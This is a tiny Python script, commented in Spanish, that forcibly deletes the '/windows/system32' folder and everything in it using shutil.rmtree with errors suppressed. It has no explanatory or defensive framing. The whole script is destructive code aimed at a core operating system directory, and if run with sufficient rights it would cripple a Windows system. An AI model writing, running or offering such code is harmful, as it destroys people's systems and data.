import shutil

# Ruta de la carpeta que queremos eliminar
ruta_carpeta = "/windows/system32"

# Eliminar la carpeta y todo su contenido de manera forzada
shutil.rmtree(ruta_carpeta, ignore_errors=True)



1 